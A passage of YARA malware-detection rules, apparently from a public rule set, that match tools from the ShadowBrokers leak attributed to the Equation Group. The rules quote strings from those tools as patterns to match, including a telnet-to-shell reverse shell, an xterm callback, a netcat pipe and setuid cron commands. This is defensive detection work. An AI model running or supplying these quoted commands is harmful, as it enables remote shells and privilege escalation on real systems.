vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_porkclient\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"-c COMMAND: shell command string\" fullword ascii\n        $s2 = \"Cannot combine shell command mode with args to do socket reuse\" fullword ascii\n        $s3 = \"-r: Reuse socket for Nopen connection (requires -t, -d, -f, -n, NO -c)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 30KB and 1 of them)\n}\n\nrule EquationGroup_electricslide\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: electricslide)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_electricslide\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Firing with the same hosts, on altername ports (target is on 8080, listener on 443)\" fullword ascii\n        $x2 = \"Recieved Unknown Command Payload: 0x%x\" fullword ascii\n        $x3 = \"Usage: eslide   [options] <-t profile> <-l listenerip> <targetip>\" fullword ascii\n        $x4 = \"-------- Delete Key - Remove a *closed* tab\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 2000KB and 1 of them)\n}\n\nrule EquationGroup_libXmexploit2\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: libXmexploit2.8)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_libXmexploit2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Usage: ./exp command display_to_return_to\" fullword ascii\n        $s2 = \"sizeof shellcode = %d\" fullword ascii\n        $s3 = \"Execve failed!\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 40KB and 1 of them)\n}\n\nrule EquationGroup_wrap_telnet\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: wrap-telnet.sh)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_wrap_telnet\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"echo \\\"example: ${0} -l 192.168.1.1 -p 22222 -s 22223 -x 9999\\\"\" fullword ascii\n        $s2 = \"-x [ port to start mini X server on DEFAULT = 12121 ]\\\"\" fullword ascii\n        $s3 = \"echo \\\"Call back port2 = ${SPORT}\\\"\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 4KB and 1 of them)\n}\n\nrule EquationGroup_elgingamble\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: elgingamble)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_elgingamble\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"* * * * * root chown root %s; chmod 4755 %s; %s\" fullword ascii\n        $x2 = \"[-] kernel not vulnerable\" fullword ascii\n        $x3 = \"[-] failed to spawn shell: %s\" fullword ascii\n        $x4 = \"-s shell           Use shell instead of %s\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_cmsd\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: cmsd)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_cmsd\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"usage: %s address [-t][-s|-c command] [-p port] [-v 5|6|7]\" fullword ascii\n        $x2 = \"error: not vulnerable\" fullword ascii\n        $s1 = \"port=%d connected! \" fullword ascii\n        $s2 = \"xxx.XXXXXX\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 30KB and 1 of ($x*)) or (2 of them)\n}\n\nrule EquationGroup_ebbshave\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: ebbshave.v5)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_ebbshave\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"executing ./ebbnew_linux -r %s -v %s -A %s %s -t %s -p %s\" fullword ascii\n        $s2 = \"./ebbnew_linux.wrapper -o 2 -v 2 -t 192.168.10.4 -p 32772\" fullword ascii\n        $s3 = \"version 1 - Start with option #18 first, if it fails then try this option\" fullword ascii\n        $s4 = \"%s is a wrapper program for ebbnew_linux exploit for Sparc Solaris RPC services\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 20KB and 1 of them) or (2 of them)\n}\n\nrule EquationGroup_eggbasket\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: eggbasket)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_eggbasket\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"# Building Shellcode into exploit.\" fullword ascii\n        $x2 = \"%s -w /index.html -v 3.5 -t 10 -c \\\"/usr/openwin/bin/xterm -d 555.1.2.2:0&\\\"  -d 10.0.0.1 -p 80\" fullword ascii\n        $x3 = \"# STARTING EXHAUSTIVE ATTACK AGAINST \" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 90KB and 1 of them) or (2 of them)\n}\n\nrule EquationGroup_jparsescan\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: jparsescan)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_jparsescan\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Usage:  $prog [-f directory] -p prognum [-V ver] [-t proto] -i IPadr\" fullword ascii\n        $s2 = \"$gotsunos = ($line =~ /program version netid     address             service         owner/ );\" fullword ascii\n\n    condition:\n        (filesize < 40KB and 1 of them)\n}\n\nrule EquationGroup_sambal\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: sambal)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_sambal\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"+ Bruteforce mode.\" fullword ascii\n        $s3 = \"+ Host is not running samba!\" fullword ascii\n        $s4 = \"+ connecting back to: [%d.%d.%d.%d:45295]\" fullword ascii\n        $s5 = \"+ Exploit failed, try -b to bruteforce.\" fullword ascii\n        $s7 = \"Usage: %s [-bBcCdfprsStv] [host]\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 90KB and 1 of them) or (2 of them)\n}\n\nrule EquationGroup_pclean_v2_1_1_2\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: pclean.v2.1.1.0-linux-i386)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_pclean_v2_1_1_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s3 = \"** SIGNIFICANTLY IMPROVE PROCESSING TIME\" fullword ascii\n        $s6 = \"-c cmd_name:     strncmp() search for 1st %d chars of commands that \" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 40KB and all of them)\n}\n\nrule EquationGroup_envisioncollision\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: envisioncollision)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_envisioncollision\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"mysql \\\\$D --host=\\\\$H --user=\\\\$U --password=\\\\\\\"\\\\$P\\\\\\\" -e \\\\\\\"select * from \\\\$T\" fullword ascii\n        $x2 = \"Window 3: $0 -Uadmin -Ppassword -i127.0.0.1 -Dipboard -c\\\\\\\"sleep 500|nc\" fullword ascii\n        $s3 = \"$ua->agent(\\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\\\");\" fullword ascii\n        $s4 = \"$url = $host . \\\"/admin/index.php?adsess=\\\" . $enter . \\\"&app=core&module=applications&section=hooks&do=install_hook\\\";\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 20KB and 1 of ($x*)) or (2 of them)\n}\n\nrule EquationGroup_cmsex\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: cmsex)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_cmsex\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Usage: %s -i <ip_addr/hostname> -c <command> -T <target_type> (-u <port> | -t <port>) \" fullword ascii\n        $x2 = \"-i target ip address / hostname \" fullword ascii\n        $x3 = \"Note: Choosing the correct target type is a bit of guesswork.\" fullword ascii\n        $x4 = \"Solaris rpc.cmsd remote root exploit\" fullword ascii\n        $x5 = \"If one choice fails, you may want to try another.\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 50KB and 1 of ($x*)) or (2 of them)\n}\n\nrule EquationGroup_exze\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: exze)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_exze\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"shellFile\" fullword ascii\n        $s2 = \"completed.1\" fullword ascii\n        $s3 = \"zeke_remove\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 80KB and all of them)\n}\n\nrule EquationGroup_porkserver\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: porkserver)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_porkserver\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"%s/%s server failing (looping), service terminated\" fullword ascii\n        $s2 = \"getpwnam: %s: No such user\" fullword ascii\n        $s3 = \"execv %s: %m\" fullword ascii\n        $s4 = \"%s/%s: unknown service\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 70KB and 3 of them)\n}\n\nrule EquationGroup_DUL\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: DUL)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_DUL\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"?Usage: %s <shellcode> <output_file>\" fullword ascii\n        $x2 = \"Here is the decoder+(encoded-decoder)+payload\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 80KB and 1 of them) or (all of them)\n}\n\nrule EquationGroup_slugger2\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: slugger2)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_slugger2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"usage: %s hostip port cmd [printer_name]\" fullword ascii\n        $x2 = \"command must be less than 61 chars\" fullword ascii\n        $s1 = \"__rw_read_waiting\" fullword ascii\n        $s2 = \"completed.1\" fullword ascii\n        $s3 = \"__mutexkind\" fullword ascii\n        $s4 = \"__rw_pshared\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 50KB and (4 of them and 1 of ($x*))) or (all of them)\n}\n\nrule EquationGroup_ebbisland\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: ebbisland)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_ebbisland\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Usage: %s [-V] -t <target_ip> -p port\" fullword ascii\n        $x2 = \"error - shellcode not as expected - unable to fix up\" fullword ascii\n        $x3 = \"WARNING - core wipe mode - this will leave a core file on target\" fullword ascii\n        $x4 = \"[-C] wipe target core file (leaves less incriminating core on failed target)\" fullword ascii\n        $x5 = \"-A <jumpAddr> (shellcode address)\" fullword ascii\n        $x6 = \"*** Insane undocumented incremental port mode!!! ***\" fullword ascii\n\n    condition:\n        filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_jackpop\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: jackpop)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_jackpop\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"%x:%d  --> %x:%d %d bytes\" fullword ascii\n        $s1 = \"client: can't bind to local address, are you root?\" fullword ascii\n        $s2 = \"Unable to register port\" fullword ascii\n        $s3 = \"Could not resolve destination\" fullword ascii\n        $s4 = \"raw troubles\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 30KB and 3 of them) or (all of them)\n}\n\nrule EquationGroup_parsescan\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: parsescan)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_parsescan\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"$gotgs=1 if (($line =~ /Scan for (Sol|SNMP)\\\\s+version/) or\" fullword ascii\n        $s2 = \"Usage:  $prog [-f file] -p prognum [-V ver] [-t proto] -i IPadr\" fullword ascii\n\n    condition:\n        filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_jscan\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: jscan)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_jscan\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"$scanth = $scanth . \\\" -s \\\" . $scanthreads;\" fullword ascii\n        $s2 = \"print \\\"java -jar jscanner.jar$scanth$list\\\\n\\\";\" fullword ascii\n\n    condition:\n        filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_promptkill\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: promptkill)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_promptkill\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"exec(\\\"xterm $xargs -e /current/tmp/promptkill.kid.$tag $pid\\\");\" fullword ascii\n        $x2 = \"$xargs=\\\"-title \\\\\\\"Kill process $pid?\\\\\\\" -name \\\\\\\"Kill process $pid?\\\\\\\" -bg white -fg red -geometry 202x19+0+0\\\" ;\" fullword ascii\n\n    condition:\n        filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_epoxyresin_v1_0_0\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: epoxyresin.v1.0.0.1)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_epoxyresin_v1_0_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[-] kernel not vulnerable\" fullword ascii\n        $s1 = \".tmp.%d.XXXXXX\" fullword ascii\n        $s2 = \"[-] couldn't create temp file\" fullword ascii\n        $s3 = \"/boot/System.map-%s\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 30KB and $x1) or (all of them)\n}\n\nrule EquationGroup_estopmoonlit\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: estopmoonlit)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_estopmoonlit\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[+] shellcode prepared, re-executing\" fullword ascii\n        $x2 = \"[-] kernel not vulnerable: prctl\" fullword ascii\n        $x3 = \"[-] shell failed\" fullword ascii\n        $x4 = \"[!] selinux apparently enforcing.  Continue [y|n]? \" fullword ascii\n\n    condition:\n        filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_envoytomato\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: envoytomato)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_envoytomato\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"[-] kernel not vulnerable\" fullword ascii\n        $s2 = \"[-] failed to spawn shell\" fullword ascii\n\n    condition:\n        filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_smash\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: smash)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_smash\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"T=<target IP> [O=<port>] Y=<target type>\" fullword ascii\n        $x2 = \"no command given!! bailing...\" fullword ascii\n        $x3 = \"no port. assuming 22...\" fullword ascii\n\n    condition:\n        filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_ratload\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: ratload)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_ratload\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"/tmp/ratload.tmp.sh\" fullword ascii\n        $x2 = \"Remote Usage: /bin/telnet locip locport < /dev/console | /bin/sh\\\"\" fullword ascii\n        $s6 = \"uncompress -f ${NAME}.Z && PATH=. ${ARGS1} ${NAME} ${ARGS2} && rm -f ${NAME}\" fullword ascii\n\n    condition:\n        filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_ys\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: ys.auto)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_ys\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"EXPLOIT_SCRIPME=\\\"$EXPLOIT_SCRIPME\\\"\" fullword ascii\n        $x3 = \"DEFTARGET=`head /current/etc/opscript.txt 2>/dev/null | grepip 2>/dev/null | head -1`\" fullword ascii\n        $x4 = \"FATAL ERROR: -x port and -n port MUST NOT BE THE SAME.\" fullword ascii\n\n    condition:\n        filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_ewok\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: ewok)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_ewok\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Example: ewok -t target public\" fullword ascii\n        $x2 = \"Usage:  cleaner host community fake_prog\" fullword ascii\n        $x3 = \"-g  - Subset of -m that Green Spirit hits \" fullword ascii\n        $x4 = \"--- ewok version\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 80KB and 1 of them)\n}\n\nrule EquationGroup_xspy\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: xspy)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_xspy\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"USAGE: xspy -display <display> -delay <usecs> -up\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 60KB and all of them)\n}\n\nrule EquationGroup_estesfox\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: estesfox)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_estesfox\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"chown root:root x;chmod 4777 x`' /tmp/logwatch.$2/cron\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_elatedmonkey_1_0_1_1\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: 